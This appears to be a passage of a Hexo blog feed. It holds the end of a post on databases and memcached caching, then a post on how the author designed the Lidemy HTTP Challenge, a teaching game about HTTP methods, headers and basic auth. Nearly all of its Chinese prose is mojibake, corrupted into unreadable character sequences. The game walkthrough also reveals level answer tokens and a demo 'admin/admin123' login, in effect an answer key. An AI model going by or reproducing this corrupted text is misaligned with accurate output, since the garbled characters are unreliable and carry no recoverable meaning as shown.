æ­¤å¤– memcached çš„ API ä½¿ç”¨ä¸‰åäºŒä½å…ƒçš„å¾ªç’°å†—é¤˜æ ¡é©—ï¼ˆCRC-32ï¼‰è¨ˆç®—éµå€¼å¾Œï¼Œå°‡è³‡æ–™åˆ†æ•£åœ¨ä¸åŒçš„æ©Ÿå™¨ä¸Šã€‚ç•¶è¡¨æ ¼æ»¿äº†ä»¥å¾Œï¼Œæ¥ä¸‹ä¾†æ–°å¢çš„è³‡æ–™æœƒä»¥ LRU æ©Ÿåˆ¶æ›¿æ›æ‰ã€‚ç”±æ–¼ memcached é€šå¸¸åªæ˜¯ç•¶ä½œå¿«å–ç³»çµ±ä½¿ç”¨ï¼Œæ‰€ä»¥ä½¿ç”¨ memcached çš„æ‡‰ç”¨ç¨‹å¼åœ¨å¯«å›è¼ƒæ…¢çš„ç³»çµ±æ™‚ï¼ˆåƒæ˜¯å¾Œç«¯çš„è³‡æ–™åº«ï¼‰é€šå¸¸éœ€è¦é¡å¤–çš„ç¨‹å¼ç¢¼æ›´æ–° memcached å…§çš„è³‡æ–™ã€‚
function get_foo (int userid) &#123;   result = db_select(&quot;SELECT * FROM users WHERE userid = ?&quot;, userid);   return result;&#125;
ä¸‹é¢çš„ç¨‹å¼æœƒå…ˆåˆ° Memcache æª¢æŸ¥æ˜¯å¦æœ‰ userrow:userid çš„è³‡æ–™ï¼Œå¦‚æœæœ‰å‰‡ç›´æ¥å‚³å›çµæœï¼Œå¦‚æœä¸å­˜åœ¨æ™‚å†å»è³‡æ–™åº«æŸ¥è©¢ï¼Œä¸¦å°‡çµæœæ”¾åˆ° Memcache å…§ï¼Œè¨˜å¾—è¦åŒæ­¥è³‡æ–™åº«å’Œ Memcacheï¼Œé¿å… Cache coherency å•é¡Œï¼š
function get_foo (int userid) &#123;    result = memcached_fetch(&quot;userrow:&quot; + userid);    if (!result) &#123;        result = db_select(&quot;SELECT * FROM users WHERE userid = ?&quot;, userid);        memcached_add(&quot;userrow:&quot; + userid,  result);    &#125;    return result;&#125;

AWS DynamoDBAmazon DynamoDB æ˜¯ä¸€ç¨®å¿«é€Ÿéˆæ´»çš„ NoSQL é›²ç«¯è³‡æ–™åº«æœå‹™ï¼Œé©åˆæ‰€æœ‰éœ€è¦ä¸€è‡´æ€§ä¸”å»¶é²ä½æ–¼ 10 æ¯«ç§’è¦æ¨¡æ‡‰ç”¨ç¨‹å¼ã€‚å®ƒæ˜¯å…¨å—ç®¡çš„é›²ç«¯è³‡æ–™åº«ï¼Œæ”¯æ´æ–‡ä»¶å’Œéµå€¼å­˜æ”¾æ¨¡å‹ã€‚
ç¸½çµä»¥ä¸Šä»‹ç´¹äº†å¾Œç«¯è»Ÿé«”å·¥ç¨‹å·¥å…·ç®±ï¼šè³‡æ–™åº«&#x2F;SQL&#x2F;ORM ç›¸é—œè­°é¡Œï¼Œåœ¨æ¥ä¸‹ä¾†çš„ç« ç¯€ä¸­æˆ‘å€‘å°‡ç‚ºå¤§å®¶æ‰“é–‹å¾Œç«¯å·¥ç¨‹çš„å·¥å…·ç®±ï¼Œä»‹ç´¹é‚£äº›å¿…é ˆæŒæ¡çš„å¾Œç«¯è»Ÿé«”å·¥ç¨‹çŸ¥è­˜ã€‚
å»¶ä¼¸é–±è®€
ä¸¦ç™¼æ§åˆ¶ï¼ˆè‹±èªï¼šConcurrency controlï¼‰
SQL èªæ³•æ•™å­¸
è³‡æ–™åº«æ¦‚å¿µ
MySQLä¸PostgreSQLï¼šè¯¥é€‰æ‹©å“ªä¸ªå¼€æºæ•°æ®åº“ï¼Ÿå“ªä¸€ä¸ªæ›´å¥½ï¼Ÿ
èªªæ˜è³‡æ–™åº«æ­£è¦åŒ–åŸºæœ¬æ¦‚å¿µ
SQL Tutorial
MySQL è¶…æ–°æ‰‹å…¥é–€ï¼ˆ8ï¼‰å„²å­˜å¼•æ“èˆ‡è³‡æ–™å‹æ…‹
æ¨™é¡Œ[SQL ] æ¬„ä½å‘½åè¦å‰‡
è³‡æ–™åº«ç‰©ä»¶å‘½ååŸå‰‡
è³‡æ–™åº«è¡¨å–®åŠæ¬„ä½å‘½åè¦å‰‡å¯¦ä¾‹

é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>Python</tag>
        <tag>PHP</tag>
        <tag>Back End</tag>
        <tag>Back End Development</tag>
        <tag>Back End Engineer</tag>
        <tag>TCP</tag>
        <tag>HTTP</tag>
        <tag>UDP</tag>
      </tags>
  </entry>
  <entry>
    <title>å¹•å¾ŒèŠ±çµ®ï¼šLidemy HTTP Challenge çš„è¨­è¨ˆä»¥åŠå½©è›‹</title>
    <url>/2019/05/18/behind-the-scenes-http-challenge/</url>
    <content><![CDATA[å‰è¨€å‰é™£å­æˆ‘ç‚ºäº†å¹«è‡ªå·±çš„å­¸ç”Ÿå€‘æ›´ç†Ÿæ‚‰ HTTP ä»¥åŠ API çš„ä¸²æ¥ï¼Œå¯«å‡ºäº†ä¸€å€‹å°éŠæˆ²ï¼šLidemy HTTP Challengeï¼Œéœ€è¦æ ¹æ“šæ¯ä¸€é—œçš„èªªæ˜å–å¾—æ­£ç¢ºçš„ tokenï¼Œä¸€å…±æœ‰åäº”é—œï¼Œå‰åé—œåŸºæœ¬ï¼Œå¾Œäº”é—œé€²éšã€‚
ç¶“éäº†ä¸€äº›æœ‹å‹çš„æ¸¬è©¦ä¹‹å¾Œï¼Œæ…¢æ…¢èª¿æ•´ã€æ”¹å–„ï¼Œæœ€å¾Œè®“å­¸ç”Ÿæ¸¬è©¦ç™¼ç¾åæ‡‰éƒ½ä¸éŒ¯ï¼Œæ–¼æ˜¯å°±åœ¨å‰ç«¯ç¤¾ç¾¤æ­£å¼å°å¤–å…¬é–‹é€™å€‹éŠæˆ²ï¼Œè®“å¤§å®¶ä¹Ÿèƒ½ä¸€èµ·åƒèˆ‡ã€‚
å¦‚æœä½ é‚„æ²’ç©éï¼Œé‚£å¼·çƒˆå»ºè­°ä½ ä¸è¦çœ‹é€™ç¯‡æ–‡ç« ï¼Œå› ç‚ºé€™ç¯‡æ–‡ç« æœƒç ´å£ä½ éŠç©çš„èˆˆè‡´ï¼ˆå¤§æ¦‚å°±è·Ÿé›»å½±çˆ†é›·ä¸€æ¨£ï¼‰ã€‚å»ºè­°å¯ä»¥å…ˆå»ç©ä¸€ä¸‹ï¼Œç­‰å…¨ç ´äº†å†å›ä¾†çœ‹é€™ç¯‡æ–‡ç« ï¼Œæœƒå¾—åˆ°ä¸€äº›ä¸åŒçš„æ”¶ç©«ã€‚
æ¥ä¸‹ä¾†æˆ‘æœƒè¬›ä¸€ä¸‹é€™å€‹éŠæˆ²èª•ç”Ÿçš„æ­·ç¨‹ä»¥åŠæ¯å€‹é—œå¡çš„è¨­è¨ˆã€‚
å‰äººç¨®æ¨¹ï¼Œå¾Œäººä¹˜æ¶¼é€™ç¨®ä»¥éŠæˆ²ç•¶åšå¤–æ®¼ï¼Œå…§å®¹å»æ˜¯æ»¿æ»¿æŠ€è¡“çš„æ‰‹æ³•å¤§å®¶æ‡‰è©²ä¸¦ä¸é™Œç”Ÿï¼Œè‡³å°‘æˆ‘å¾ˆä¸é™Œç”Ÿã€‚
æœ€ä¸€é–‹å§‹æœ‰æƒ³è¦åšæˆéŠæˆ²çš„é€™å€‹æƒ³æ³•ï¼Œå…¶å¯¦æ˜¯å› ç‚ºä¸€å€‹å­¸ç”Ÿå‚³çµ¦æˆ‘é€™å€‹ï¼šdevtestï¼Œé€™æ˜¯æ³•åœ‹æŸä¸€é–“å…¬å¸çš„é¢è©¦è€ƒé¡Œï¼Œå¦‚æœä½ çœ‹åˆ°ç•«é¢ä¸€ç‰‡ç™½ï¼Œé‚£çµ•å°ä¸æ˜¯ç¶²é å£æ‰ï¼Œä¸ç”¨æ“”å¿ƒã€‚
ç ´å®Œäº†ä¸Šé¢é€™å€‹éŠæˆ²ä¹‹å¾Œï¼Œæˆ‘æ‰æƒ³èµ·è‡ªå·±å°é€™ç¨®æ¨¡å¼å…¶å¯¦å¾ˆä¸é™Œç”Ÿã€‚å°æ™‚å€™ç©éé«˜æ‰‹éæ‹›ï¼Œä¹Ÿç©éé¡ä¼¼ Hack This Site!
 çš„éŠæˆ²ã€‚
æˆ–æ˜¯ä»¥å‰æœ‰ä¸€é™£å­è§£è¬éŠæˆ²æ­£å¤¯ï¼ˆè·Ÿç¨‹å¼ç„¡é—œçš„é‚£ç¨®ï¼‰ï¼Œæˆ‘ä¹Ÿæ›¾ç¶“è‡ªå·±åšäº†ä¸€å€‹ï¼Œé‚£æ™‚å€™æ˜¯ç”¨ PIXNET æ–‡ç« é–å¯†ç¢¼çš„æ–¹å¼ä¾†åšé—œå¡ï¼Œç¾åœ¨æƒ³æƒ³çœŸæ˜¯å€‹éå¸¸æ–¹ä¾¿çš„æ–¹æ³•ã€‚
ç¸½ä¹‹å‘¢ï¼Œé›–ç„¶å°æ™‚å€™éƒ½ç©éï¼Œä½†é•·å¤§ä¹‹å¾Œå»æ…¢æ…¢å¿˜è¨˜é‚„æœ‰é€™ç¨®æ¨¡å¼ã€‚é€™ç¨®æ¨¡å¼çš„å¥½è™•å°±åœ¨æ–¼å®ƒæ˜¯éŠæˆ²ã€‚éŠæˆ²åšå¾—å¥½ï¼Œæ¯å€‹äººéƒ½æœƒæ„›ä¸Šå®ƒã€‚è€Œä¸”æœƒæ¯”ä¸€èˆ¬çš„ä½ å•æˆ‘ç­”æˆ–æ˜¯ç°¡ç­”é¡Œæœ‰è¶£å¤šäº†ï¼Œæ‰€ä»¥éŠæˆ²æ˜¯å€‹å¾ˆå¥½çš„åˆ‡å…¥é»ã€‚
æƒ³èµ·éŠæˆ²çš„å¥½è™•ä»¥å¾Œï¼Œæˆ‘å°±æ±ºå®šè¦è‡ªå·±ä¾†åšä¸€å€‹äº†ï¼Œè€Œä¸»é¡Œå°±æ˜¯ä¹‹å‰æˆ‘çš„å­¸ç”Ÿå€‘æœ€ä¸ç†Ÿæ‚‰çš„ä¸²æ¥ Web APIï¼
æœ€åˆçš„æ§‹æƒ³æœ€ä¸€é–‹å§‹çš„æƒ³æ³•æ˜¯ï¼š

æˆ‘å¸Œæœ›é€™æ˜¯ä¸€å€‹ä½ ç”¨ curl ä¹Ÿå¯ä»¥ç©çš„éŠæˆ²

å› ç‚ºæˆ‘è¦ºå¾—é€™æ¨£å¾ˆ coolï¼Œä½ ç”¨ terminal æ­é…æŒ‡ä»¤å°±å¯ä»¥ç©é€™å€‹éŠæˆ²ï¼Œç”šè‡³é€£ç€è¦½å™¨éƒ½ä¸éœ€è¦é–‹ï¼
å› æ­¤ï¼Œåœ¨ç•«é¢çš„å‘ˆç¾ä¸Šå¾æœ€åˆæˆ‘å°±æ‰“ç®—æ˜¯ç´”æ–‡å­—çš„ï¼Œæ²’æœ‰ä»»ä½•é€£çµæˆ–æ˜¯èŠ±èŠ±ç¶ ç¶ çš„æ±è¥¿ï¼Œå®ƒå°±æ˜¯å€‹ç´”æ–‡å­—æª”ï¼å¦‚æœæœ‰é€£çµä¹Ÿä¸æœƒæœ‰ &lt;a&gt;ï¼Œå°±åªæœƒæ˜¯å€‹ URL è€Œå·²ã€‚
å½¢å¼çš„è©±ï¼Œå°±æ˜¯æ¯”ç…§å…¶ä»–éŠæˆ²ç”¨é—–é—œçš„ã€‚
å¤§è‡´ä¸Šéƒ½å®šå¥½ä¹‹å¾Œï¼Œå°±æ˜¯è¦ä¾†æ±ºå®šé—œå¡çš„å…§å®¹è¦æœ‰å“ªäº›ã€‚åœ¨ä¸€é–‹å§‹æˆ‘åŸæœ¬æƒ³åšäºŒåé—œï¼Œå¾Œä¾†åˆ—ä¸€åˆ—æƒ³è¦å‡ºç¾çš„é¡Œç›®ï¼Œç™¼ç¾å¤§æ¦‚åªèƒ½åšå€‹å…­ä¸ƒé—œå·¦å³ã€‚
åŸæœ¬çš„æ§‹æƒ³å¦‚ä¸‹ï¼š

CURD ä¸€å®šè¦æœ‰ï¼Œè¦è®“å­¸ç”Ÿæœƒä¸² API çš„é€™å››ç¨®åŸºæœ¬æ“ä½œ
custom header ä¸€å®šè¦æœ‰
origin ç›¸é—œçš„é¡Œç›®ä¸€å®šè¦æœ‰
user agent ç›¸é—œçš„é¡Œç›®ä¸€å®šè¦æœ‰

å¾Œä¸‰å€‹ä¸€å®šè¦æœ‰æ˜¯å› ç‚ºæˆ‘è¦ºå¾—é€™åœ¨ç†è§£ HTTP è·Ÿä¸² API ä¸Šé¢ä¹Ÿå¾ˆé‡è¦ã€‚
custom header å¸¸å¸¸æœƒä¾†å¸¶ä¸€äº›é¡å¤–è³‡è¨Šï¼Œæˆ–æ˜¯æœ€å¸¸åšçš„å°±æ˜¯é©—è­‰ã€‚origin çš„è©±æƒ³è®“å­¸ç”Ÿç†è§£ same origin policy åªè·Ÿç€è¦½å™¨æœ‰é—œï¼Œè„«é›¢äº†ç€è¦½å™¨å°±å®Œå…¨æ²’æœ‰é€™å€‹é™åˆ¶ã€‚user agent å‰‡æ˜¯å·¥ä½œä¸Šæ»¿å¯¦ç”¨çš„ï¼Œæœƒéœ€è¦åˆ¤æ–·ä½¿ç”¨è€…çš„ç€è¦½å™¨æˆ–æ˜¯åµæ¸¬æ˜¯ä¸æ˜¯æœå°‹å¼•æ“ä¾†åšç›¸å°æ‡‰çš„è™•ç†ã€‚
è¦å‡ºç¾çš„æ±è¥¿å¤§è‡´ä¸Šæœ‰æƒ³æ³•äº†ï¼Œæœ€å¾Œå°±æ˜¯å¯¦éš›çš„å…§å®¹è·Ÿ token çš„è¨­è¨ˆã€‚éŠæˆ²çš„å…§å®¹å¦‚æœåªæœ‰ï¼šã€Œè«‹ä½  POST ä¸€ç­†è³‡æ–™å» XXXã€å¤ªç„¡èŠäº†ï¼Œæ‰€ä»¥æˆ‘æŠŠå ´æ™¯è¨­å®šåœ¨ç©å®¶æ˜¯ä¸€å€‹å»åœ–æ›¸é¤¨å¹«å¿™çš„æ–°æ‰‹ï¼Œè¦å¹«åŠ©è€çˆºçˆºè§£æ±ºä¸€äº›åœ–æ›¸è³‡è¨Šç³»çµ±çš„å•é¡Œã€‚
è‡³æ–¼æ›¸ç±è³‡æ–™æˆ‘å°±å¾ˆå¿«å»æŸç¶²ç«™çˆ¬äº†ä¸€ä¸‹ç„¶å¾Œç¨å¾®åšè™•ç†ï¼Œè³‡æ–™çš„éƒ¨åˆ†å°±é€™æ¨£å¾ˆå¿«æå®šäº†ã€‚
æœ‰äº†æ•…äº‹ä¹‹å¾Œï¼Œé‚„æƒ³è¦è—å¹¾å€‹å½©è›‹åœ¨è£¡é¢ã€‚èˆ‡å…¶èªªæ˜¯å½©è›‹ï¼Œä¸å¦‚èªªæ˜¯ä¸€äº›æˆ‘è¦ºå¾—æ¯”è¼ƒæœ‰è¶£çš„å°æ±è¥¿ï¼Œçœ‹çœ‹æœ‰æ²’æœ‰äººæœƒç™¼ç¾ã€‚å› æ­¤åœ¨é—œå¡çš„å…§å®¹è·Ÿ token ä¸Šé¢å…¶å¯¦éƒ½æœ‰è—ä¸€äº›æ±è¥¿ã€‚
æˆ‘è¨˜å¾—æœ€åˆçš„ç‰ˆæœ¬æˆ‘å¤§æ¦‚èŠ±äº†å…©å¤©å°±åšå®Œäº†ã€‚ä¸€å¤©æƒ³é—œå¡å¦å¤–ä¸€å¤©å¯« codeï¼Œæƒ³é—œå¡çš„éƒ¨åˆ†èŠ±æ¯”è¼ƒä¹…ï¼Œå› ç‚ºç¨‹å¼ç¢¼å¯¦åšçš„éƒ¨åˆ†æ»¿ç°¡å–®çš„ã€‚
æ¥è‘—å°±è®“æˆ‘å€‘å…ˆä¾†çœ‹çœ‹å‰åé—œæ¯ä¸€é—œçš„å…§å®¹å§ï¼
å†æ¬¡å¼·èª¿ï¼Œå¦‚æœä½ é‚„æ²’ç ´å®Œï¼Œå¼·çƒˆå»ºè­°ä¸è¦è§€çœ‹ï¼è¶•å¿«å…ˆå»ç©ï¼šLidemy HTTP Challengeã€‚
ç¬¬ä¸€é—œå•Š...å¥½ä¹…æ²’æœ‰çœ‹åˆ°å¹´è¼•äººåˆ°æˆ‘é€™å€‹åœ–æ›¸é¤¨äº†ï¼Œæˆ‘å«åš libï¼Œæ˜¯é€™å€‹åœ–æ›¸é¤¨çš„ç®¡ç†å“¡å¾ˆé–‹å¿ƒçœ‹åˆ°æœ‰å¹´è¼•äººé¡˜æ„ä¾†å¹«å¿™ï¼Œæœ€è¿‘åœ–æ›¸é¤¨å‰›æ›äº†è³‡è¨Šç³»çµ±ï¼Œæˆ‘éƒ½æä¸æ¸…æ¥šæ€éº¼ç”¨äº†...  é€™æ˜¯ä»–å€‘æä¾›çµ¦æˆ‘çš„æ–‡ä»¶ï¼Œæˆ‘ä¸€å€‹å­—éƒ½çœ‹ä¸æ‡‚ï¼Œä½†å°ä½ å¯èƒ½æœƒæœ‰å¹«åŠ©å…ˆæŠŠé€™æ–‡ä»¶æ”¾ä¸€æ—å§ï¼Œé€™å€‹å¾…æœƒæ‰æœƒç”¨åˆ°ä½ å«åšä»€éº¼åå­—å‘¢ï¼Ÿç”¨ GET æ–¹æ³•è·Ÿæˆ‘èªªä½ çš„ name å«åšä»€éº¼å§ï¼é™¤äº† token ä»¥å¤–é †ä¾¿æŠŠ name ä¸€èµ·å¸¶ä¸Šä¾†å°±å¯ä»¥äº†

ç¬¬ä¸€é—œåªæ˜¯æƒ³è®“å¤§å®¶å…ˆæ‹¿åˆ° API æ–‡ä»¶ï¼Œç„¶å¾Œç†Ÿæ‚‰ä¸€ä¸‹æœ‰äº›é—œå¡æœƒéœ€è¦ç›´æ¥æŠŠè³‡è¨Šå¸¶åœ¨ç¶²å€ä¸Šï¼Œå› æ­¤ç¬¬ä¸€é—œå°±åªæ˜¯è®“å¤§å®¶ç†Ÿæ‚‰ç’°å¢ƒè€Œå·²ã€‚
å‚³å…¥ name ä»¥å¾Œï¼Œå°±å¯ä»¥æ‹¿åˆ°ç¬¬äºŒé—œçš„ tokenã€‚
å…¶å¯¦é€™é‚Šå‰›é–‹å§‹çš„æ™‚å€™æœ‰ä¸å°‘äººå¡ä½ï¼Œå› ç‚ºé¡Œç›®èªªæ˜ä¸æ¸…æ¥šï¼Œæ‰€ä»¥æœ‰äº›äººæœƒä»¥ç‚ºæ˜¯ä¸æ˜¯è¦å» call API ä¹‹é¡çš„ã€‚å¾Œä¾†æˆ‘å°±æ”¹äº†ä¸€ä¸‹é¡Œç›®èªªæ˜ï¼Œç›¡å¯èƒ½è¬›æ¸…æ¥šï¼Œä¹‹å¾Œä¹Ÿæ–°å¢äº†æç¤ºçš„åŠŸèƒ½ã€‚
ç¬¬äºŒé—œæˆ‘å‰é™£å­åœ¨æ•´ç†æ›¸ç±çš„æ™‚å€™çœ‹åˆ°äº†ä¸€æœ¬æˆ‘å¾ˆå–œæ­¡çš„æ›¸ï¼Œå¯æ˜¯ç¾åœ¨å»æ€éº¼æƒ³éƒ½æƒ³ä¸èµ·ä¾†æ˜¯å“ªä¸€æœ¬...æˆ‘åªè¨˜å¾—é‚£æœ¬æ›¸çš„ id æ˜¯å…©ä½æ•¸ï¼Œä»‹æ–¼ 54~58 ä¹‹é–“ï¼Œä½ å¯ä»¥å¹«å¹«æˆ‘å—ï¼Ÿæ‰¾åˆ°æ˜¯å“ªä¸€æœ¬ä¹‹å¾ŒæŠŠæ›¸çš„ id ç”¨ GET å‚³çµ¦æˆ‘å°±è¡Œäº†ã€‚

é€™é—œçš„ id ç¯„åœæ˜¯ 54~58ï¼Œå…¶å¯¦åŸæœ¬å°±æ˜¯æƒ³è®“å¤§å®¶ä¸€å€‹ä¸€å€‹è©¦ï¼Œæ²’æœ‰å…¶ä»–æ–¹æ³•ã€‚
é€™é‚Šè—çš„å°å½©è›‹æ˜¯ id 56 çš„æ›¸ç±å°±æ˜¯ 5566 çš„æ›¸ï¼š
&#123;&quot;id&quot;:56,&quot;name&quot;:&quot;5566ï¼èªçœŸ&quot;,&quot;author&quot;:&quot;é„­ä½©èŠ¬&quot;,&quot;ISBN&quot;:&quot;0614361311&quot;&#125;

æ‰€ä»¥ä¸‹ä¸€é—œçš„ token æ‰æœƒæ˜¯ 5566NO1
ç¬¬ä¸‰é—œçœŸæ˜¯å¤ªæ„Ÿè¬ä½ å¹«æˆ‘æ‰¾åˆ°é€™æœ¬æ›¸äº†ï¼  å‰›å‰›åœ¨ä½ æ‰¾æ›¸çš„æ™‚å€™æœ‰ä¸€æ‰¹æ–°çš„æ›¸ç±é€ä¾†äº†ï¼Œæ˜¯é€™æ¬¡åœ–æ›¸é¤¨æ ¹æ“šè®€è€…çš„æ¨è–¦è²·çš„æ–°æ›¸ï¼Œå…¶ä¸­æœ‰ä¸€æœ¬æˆ‘ç‰¹åˆ¥å–œæ­¡ï¼Œæƒ³è¦å„ªå…ˆä¸Šæ¶ã€‚æ›¸åæ˜¯ã€Šå¤§è…¦å–œæ­¡é€™æ¨£å­¸ã€‹ï¼ŒISBN ç‚º 9789863594475ã€‚  å°±æ‹œè¨—ä½ äº†ã€‚æ–°å¢å®Œä¹‹å¾Œå¹«æˆ‘æŠŠæ›¸ç±çš„ id ç”¨ GET å‘Šè¨´æˆ‘ã€‚

é€™é—œå°±åªæ˜¯åœ¨æ¸¬é©—æœƒä¸æœƒç”¨ POST è€Œå·²ã€‚
æœ‰ä¸€å€‹å°åœ°æ–¹æ˜¯åŸæœ¬ API æ–‡ä»¶æ²’æœ‰å¯«æ¸…æ¥šè¦æ€æ¨£ POSTï¼Œcontent type æ˜¯ form é‚„æ˜¯ JSONï¼Ÿæ‰€ä»¥å¾Œä¾†æŠŠé€™å¡Šè£œä¸Šå»äº†ï¼Œé¿å…ç”¢ç”Ÿæ­§ç¾©ã€‚
ç¬¬å››é—œæˆ‘ç¿»äº†ä¸€ä¸‹ä½ ä¹‹å‰å¹«æˆ‘æ‰¾çš„é‚£æœ¬æ›¸ï¼Œç™¼ç¾æˆ‘è¨˜éŒ¯äº†...é€™ä¸æ˜¯æˆ‘æœæ€æš®æƒ³çš„é‚£ä¸€æœ¬ã€‚æˆ‘ä¹‹å‰è·Ÿä½ è¬›çš„ç·šç´¢å¥½åƒéƒ½æ˜¯éŒ¯çš„ï¼Œæˆ‘è¨˜åˆ°åˆ¥æœ¬æ›¸å»äº†ï¼ŒçœŸæ˜¯æŠ±æ­‰å•Šã€‚æˆ‘è¨˜å¾—æˆ‘æƒ³æ‰¾çš„é‚£æœ¬æ›¸ï¼Œæ›¸åæœ‰ï¼šã€Œä¸–ç•Œã€å…©å­—ï¼Œè€Œä¸”æ˜¯æ‘ä¸Šæ˜¥æ¨¹å¯«çš„ï¼Œå¯ä»¥å¹«æˆ‘æ‰¾åˆ°æ›¸çš„ id ä¸¦å‚³çµ¦æˆ‘å—ï¼Ÿ

é€™é—œæ¸¬é©—æœƒä¸æœƒä½¿ç”¨ API çš„åƒæ•¸ä¾†æŸ¥è©¢æ›¸ç±ï¼Œä½†è¦ä½œå¼Šç›´æ¥åœ¨ local æœå°‹å…¶å¯¦ä¹Ÿå¯ä»¥ã€‚
æˆ‘è‡ªå·±æ»¿æ„›æ‘ä¸Šæ˜¥æ¨¹ï¼Œè€Œæˆ‘æœ‰å€‹æœ‹å‹é…·æ„›ã€Šä¸–ç•Œæœ«æ—¥èˆ‡å†·é…·ç•°å¢ƒã€‹é€™æœ¬æ›¸ï¼Œæ‰€ä»¥å°±æŠŠå®ƒæ”¾é€²ä¾†äº†ã€‚ç‚ºäº†è®“æœå°‹ã€Œä¸–ç•Œã€çš„æ™‚å€™ä¸è¦åªå‡ºç¾ä¸€å€‹çµæœï¼Œæˆ‘é‚„å»æ‰¾äº†å…¶ä»–å¹¾æœ¬ä¹Ÿæœ‰é€™å€‹é—œéµå­—çš„æ›¸æ”¾é€²å»ã€‚
è€Œä¸‹ä¸€é—œçš„ token HarukiMurakami å°±æ˜¯æ‘ä¸Šæ˜¥æ¨¹çš„åå­—ã€‚ 
ç¬¬äº”é—œæ˜¨å¤©æœ‰å€‹äººåŒ†åŒ†å¿™å¿™è·‘éä¾†èªªä»–ä¸å°å¿ƒæéŒ¯æ›¸äº†ï¼Œæƒ³è¦ä¾†å•å¯ä¸å¯ä»¥æŠŠæ›¸æ‹¿å›å»ã€‚è·Ÿä»–æºé€šéå¾Œï¼Œæˆ‘å°±æŠŠä»–æéä¾†çš„æ›¸é‚„ä»–äº†ï¼Œæ‰€ä»¥ç¾åœ¨è¦æŠŠé€™æœ¬æ›¸å¾ç³»çµ±è£¡é¢åˆªæ‰æ‰è¡Œã€‚é‚£æœ¬æ›¸çš„ id æ˜¯ 23ï¼Œä½ å¯ä»¥å¹«æˆ‘åˆªæ‰å—ï¼Ÿ

é€™é—œè€ƒ DELETE çš„ä½¿ç”¨è€Œå·²ï¼Œæ²’ä»€éº¼é›£åº¦ã€‚
é€™é‚Šè—çš„å°å½©è›‹æ˜¯ä»–æéŒ¯çš„æ›¸æ˜¯é›æ’å¦¹å¯«çœŸé›†ï¼Œæ‰€ä»¥æƒ³è¶•å¿«æ‹¿å›å»ã€‚é€™ä¹Ÿå°æ‡‰åˆ°äº†ä¸‹ä¸€é—œçš„ tokenï¼šCHICKENCUTLETã€‚
ç¬¬å…­é—œæˆ‘çµ‚æ–¼çŸ¥é“ä¸Šæ¬¡å“ªè£¡æ€ªæ€ªçš„äº†ï¼ç…§ç†ä¾†èªªè¦é€²å…¥ç³»çµ±æ‡‰è©²è¦å…ˆç™»å…¥æ‰å°ï¼Œæ€éº¼æ²’æœ‰ç™»å…¥å°±å¯ä»¥æ–°å¢åˆªé™¤...é€™å¤ªå¥‡æ€ªäº†ï¼Œæˆ‘å·²ç¶“å›å ±çµ¦é‚£é‚Šçš„å·¥ç¨‹å¸«äº†ï¼Œä»–å€‘çµ¦äº†æˆ‘ä¸€ä»½æ–°çš„æ–‡ä»¶ï¼šé€™é‚Šæ˜¯å¸³è™Ÿå¯†ç¢¼ï¼Œä½ å…ˆç™»å…¥è©¦è©¦çœ‹å§ï¼Œå¯ä»¥å‘¼å«ä¸€å€‹ /me çš„ endpointï¼Œè£¡é¢æœƒçµ¦ä½ ä¸€å€‹ emailã€‚æŠŠ email æ”¾åœ¨ query string ä¸Šé¢å¸¶éä¾†ï¼Œæˆ‘çœ‹çœ‹æ˜¯ä¸æ˜¯å°çš„ã€‚å¸³è™Ÿï¼šadminå¯†ç¢¼ï¼šadmin123

å°æ–°æ‰‹ä¾†èªªå…¶å¯¦ç®—æ˜¯æ¯”è¼ƒæœ‰æŒ‘æˆ°æ€§çš„ä¸€é—œã€‚
é€™é—œè€ƒçš„æ˜¯çŸ¥ä¸çŸ¥é“æ€éº¼æ¨£åœ¨ header è£¡é¢æ”¾å…§å®¹ï¼Œä»¥åŠæ ¹æ“šè³‡æ–™å»æ‰¾å‡ºæ€éº¼ç”¨ http basic authorizationã€‚ä¸»è¦æ˜¯æƒ³è®“å¤§å®¶çŸ¥é“ HTTP çš„å…¶ä¸­ä¸€ç¨®é©—è­‰æ–¹å¼ã€‚
ç¬¬ä¸ƒé—œé‚£é‚Šçš„å·¥ç¨‹å¸«èªªç³»çµ±æ•´å€‹ä¿®å¾©å®Œæˆäº†ï¼Œå‰›å¥½æ˜¨å¤©æˆ‘å€‘ç™¼ç¾æœ‰ä¸€æœ¬æ›¸è¢«å·èµ°äº†...é€™æœ¬æ›¸æˆ‘å€‘å·²ç¶“è²·ç¬¬äº”æ¬¡äº†ï¼Œæ¯æ¬¡éƒ½è¢«å·èµ°ï¼Œçœ‹ä¾†é€™æœ¬æ›¸å¾ˆç†±é–€å•Šã€‚æˆ‘å€‘è¦æŠŠé€™æœ¬æ›¸å¾ç³»çµ±è£¡é¢åˆªæ‰ï¼Œå°±æ‹œè¨—ä½ äº†ã€‚å°äº†ï¼è¨˜å¾—è¦ç”¨æ–°çš„ç³»çµ±å–”ï¼ŒèˆŠçš„å·²ç¶“å®Œå…¨å»¢æ£„ä¸ç”¨äº†ã€‚æ›¸çš„ id æ˜¯ 89ã€‚

å…¶å¯¦åªæ˜¯æ²’æ¢—äº†æ‰€ä»¥åˆåŠ ä¸€å€‹åˆªé™¤è³‡æ–™çš„é—œå¡ï¼Œé€™é‚Šçš„ä¸€å€‹å°æ’æ›²æ˜¯åŸæœ¬æ²’æœ‰ã€Œå°äº†ï¼è¨˜å¾—è¦ç”¨æ–°çš„ç³»çµ±å–”ï¼ŒèˆŠçš„å·²ç¶“å®Œå…¨å»¢æ£„ä¸ç”¨äº†ã€‚ã€é€™å¥ï¼Œå°è‡´æœ‰äº›äººé‚„æ˜¯ç”¨èˆŠç‰ˆ APIï¼Œå› æ­¤æ‰åŠ ä¸Šå»ï¼Œé¿å…å¤§å®¶ææ··ã€‚
é€™æœ¬å¾ˆç†±é–€çš„æ›¸ä½ å¯¦éš›ä¸Šå»çœ‹çš„è©±ï¼Œæœƒç™¼ç¾æ˜¯ã€Šè·Ÿè‘—æœˆäº®èµ°ï¼šéŸ“åœ‹ç‘œçš„å¤œè¥²ç²¾ç¥èˆ‡å¥®é€²äººç”Ÿã€‹ï¼Œå°æ‡‰åˆ°äº†ä¸‹ä¸€é—œçš„ tokenï¼šHsifnAerokï¼Œå€’éä¾†å°±è®Š KoreanFishã€‚
